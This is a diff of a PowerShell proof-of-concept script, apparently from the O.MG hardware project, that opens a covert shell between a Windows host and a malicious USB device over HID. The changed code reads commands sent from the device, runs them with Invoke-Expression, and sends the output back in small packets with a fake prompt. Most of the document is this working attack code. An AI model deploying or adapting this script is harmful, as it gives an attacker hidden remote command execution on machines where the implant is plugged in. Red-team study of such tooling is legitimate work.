@@ -1,7 +1,7 @@
 <#
 win-hidshell.ps1
-Authors:  Wasabi (@spiceywasabi), Ø1phor1³(@01p8or13)
-Acknowledgements: rogandawes
+Authors:  Ø1phor1³(@01p8or13), Wasabi (@spiceywasabi)
+Acknowledgements: rogandawes (@RoganDawes)
 Required Dependencies: Activated HIDX on OMG Elite device
 Recommended Listener: stealthlink-client-universal.py
 #>
@@ -9,8 +9,7 @@ Recommended Listener: stealthlink-client-universal.py
 function HIDXShell {
 <#
 .DESCRIPTION
-This is a POC.
-This powershell script is a PoC for a bidirectional, shell-like connection between a host and an O.MG Elite device.
+This powershell script is a PoC for a bidirectional, shell-like connection between a host and an O.MG Elite device, which acts as a bridge between Listener and USB-Host.
 
 .PARAMETER VendorID
 Defining vendor ID of the device. (Default: D3C0)
@@ -29,7 +28,7 @@ HIDXShell -VendorID D3C0 -ProductID D34D
 https://github.com/0iphor13
 https://github.com/spiceywasabi
 https://github.com/rogandawes
-https://github.com/O-MG/O.MG-Firmware/blob/beta/tools/HIDX/python/stealthlink-client-universal.py
+https://github.com/O-MG/O.MG-Firmware/blob/stable/tools/HIDX/python/stealthlink-client-universal.py
 
 #Credits to Rogan for idea of filehandle and device identification
 #AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
@@ -56,7 +55,7 @@ X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
     $tries = 0 
     $ErrorActionPreference="Stop"
 
-    #Creating filehandle
+    #Creating filehandle - Method by rogandawes
     function CreateBinding(){
         try { 
                 Add-Type -TypeDefinition @"
@@ -82,22 +81,84 @@ namespace omg {
                 }
         }
 
+    #Identify OMG device
     function Get-OMGDevice(){
-        #Identify OMG device
         $devs = gwmi Win32_USBControllerDevice
         write-host -ForegroundColor Yellow "[?]Searching for O.MG Device..."
         $devicestring=$null
         foreach ($dev in $devs) {
             $wmidev = [wmi]$dev.Dependent
             if ($wmidev.GetPropertyValue('DeviceID') -match ($OMG) -and ($null -eq $wmidev.GetPropertyValue('Service'))) {
-                $devicestring = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
+                $devicestring = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}') #GUID_DEVINTERFACE_HID
             }
         }
         return $devicestring
     }
 
-    $loop=$true
+    #Split and Write message to filehandle
+    Function Send-Message(){
+        #Convert output to bytes
+        $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output + "> ") #Sending fake prompt to mimic a proper shell
+        $outputLength = $outputBytes.Length
+        #Send output bytes to omg
+        $outputChunkSize = 8 # Kept at 8 for best experience
+        $outputChunkNr = [Math]::Ceiling($outputLength / $outputChunkSize)
+
+        #Verbosity message
+        if ($VerbosePreference -eq 'Continue') {
+            Write-Host -ForegroundColor green "[+]Output of $($outputLength) bytes ready to send in $($outputChunkNr) packets."
+        }
+
+        $messageSendTime = Get-Date
+        for ($i = 0; $i -lt $outputChunkNr; $i++) {
+            $outputBytesToSend = New-Object Byte[] (65)
+            $outputStart = $i * $outputChunkSize
+            $outputEnd = [Math]::Min(($i + 1) * $outputChunkSize, $outputLength)
+            $outputChunkLen = $outputEnd - $outputStart
+            [System.Buffer]::BlockCopy($outputBytes, $outputStart, $outputBytesToSend, 1, $outputChunkLen) # Copy the chunk to the packet
+            if ($VerbosePreference -eq 'Continue') {
+                $currentTime = Get-Date
+                $timeDifference = $currentTime - $messageSendTime
+                Write-Host -ForegroundColor yellow "[?]Message ready to send after $($timeDifference)..."
+                $messageSendTime=$currentTime
+                $outputBytesToSend | Format-Hex
+            }
+            $filehandle.Write($outputBytesToSend, 0, 65)
+
+        }
+    }
+    
+    
     CreateBinding
+    #Find O.MG device
+    $devicestring = Get-OMGDevice
+    #Verify device - error checking
+    if($null -eq $devicestring){
+        $loop=$false
+        Write-Host -ForegroundColor red "[!]Error: No O.MG Device not found! Check VID/PID"
+        $loop=$false
+        break
+    }
+    #Verify device - open device
+    Write-Host -ForegroundColor Green "[+]Identified O.MG Device: ${devicestring}"
+    $filehandle = [omg.hidx]::open($devicestring)
+    #Verify filehandle 
+    if($null -eq $filehandle){
+        $loop=$false
+        Write-Host -ForegroundColor red "[!]Error: Filehandle is empty"
+        break
+    }
+    
+
+    #Message on initial connection
+    $output = "[+]Stealth Link Session Established!`n"
+                
+    #Sending message on initial connection
+    Write-Host -ForegroundColor Cyan "[*]Sending Connection Prompt to ${devicestring}"
+    Send-Message
+
+    #Starting loop for birectional connection
+    $loop=$true
     while ($loop) {
         try {
                 #Find O.MG device
@@ -110,7 +171,7 @@ namespace omg {
                     break
                 }
                 #Verify device - open device
-                Write-Host -ForegroundColor Green "[+]Identified O.MG Device: ${devicestring}"
+                Write-Host -ForegroundColor Green "[+]Connected O.MG Device: ${devicestring}"
                 $filehandle = [omg.hidx]::open($devicestring)
                 #Verify filehandle 
                 if($null -eq $filehandle){
@@ -148,36 +209,11 @@ namespace omg {
                     $output = Invoke-Expression $in|Out-String
                 } Catch {
                     $output = Echo "[!]Error: The command was not recognized as the name of a cmdlet, a function, a script file or an executable program."|Out-String #Error message send to receiver
-                    Write-Host -ForegroundColor red "[!]Error: Unable to run received command" #Error message in console
-                }
-                #Convert output to bytes
-                $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output + "> ") #Sending fake prompt to mimic a proper shell
-                $outputLength = $outputBytes.Length
-                #Send output bytes to omg
-                $outputChunkSize = 8 # Kept at 8 for best experience
-                $outputChunkNr = [Math]::Ceiling($outputLength / $outputChunkSize)
-
-                if ($VerbosePreference -eq 'Continue') {
-                    Write-Host -ForegroundColor green "[+]Output of $($outputLength) bytes ready to send in $($outputChunkNr) packets."
+                    Write-Host -ForegroundColor red "[!]Error: Unable to run: $in" #Error message in console
                 }
 
-                $messageSendTime = Get-Date
-                for ($i = 0; $i -lt $outputChunkNr; $i++) {
-                    $outputBytesToSend = New-Object Byte[] (65)
-                    $outputStart = $i * $outputChunkSize
-                    $outputEnd = [Math]::Min(($i + 1) * $outputChunkSize, $outputLength)
-                    $outputChunkLen = $outputEnd - $outputStart
-                    [System.Buffer]::BlockCopy($outputBytes, $outputStart, $outputBytesToSend, 1, $outputChunkLen) # Copy the chunk to the packet
-                    if ($VerbosePreference -eq 'Continue') {
-                        $currentTime = Get-Date
-                        $timeDifference = $currentTime - $messageSendTime
-                        Write-Host -ForegroundColor yellow "[?]Message ready to send after $($timeDifference)..."
-                        $messageSendTime=$currentTime
-                        $outputBytesToSend | Format-Hex
-                    }
-                    $filehandle.Write($outputBytesToSend, 0, 65)
-
-                }
+            #Sending Message to OMG Device
+            Send-Message
 
             $filehandle.Close()
         }
